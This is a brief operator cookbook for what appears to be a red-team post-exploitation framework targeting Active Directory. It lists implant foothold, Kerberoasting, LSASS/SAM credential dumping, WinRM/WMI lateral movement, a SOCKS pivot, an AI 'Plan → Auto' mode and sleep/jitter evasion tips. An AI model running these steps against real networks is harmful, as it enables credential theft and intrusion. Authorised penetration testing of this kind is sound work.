# AD engagement cookbook (Sprint 1–2)

Focused **internal AD post-ex** path. Not an MSF replacement.

## Sprint 1 path (golden)

```
foothold (implant)
  → recon (whoami, ifconfig, processes)
  → ldap_enum kerberoastable
  → kerberoast
  → mission_complete / summarize
```

Approvals: `ldap_enum`, `kerberoast` (high).

## Sprint 2 path (job-complete)

```
… golden path …
  → creds_dump lsass|sam (approve)
  → lateral_move winrm|wmi to one host (approve)
  → socks_start (optional)
  → summarize loot
```

## Operator commands (quick)

```text
sessions
use <id>
shell whoami
ifconfig
ldap-enum kerberoastable --domain DOM --dc dc.dom.local
pending / approve <id>
kerberoast --domain DOM --dc dc.dom.local --user u --pass p
creds-dump lsass
lateral winrm <target> <cmd> --user u --pass p
loot
```

## AI

```text
ai
# Plan → Auto
# Frozen objective in docs/GOLDEN_DEMO.md
```

## OPSEC

- Prefer `generate --language c` for Windows when toolchain available  
- Interactive eng: `--sleep 500`  
- Production: higher sleep + jitter  
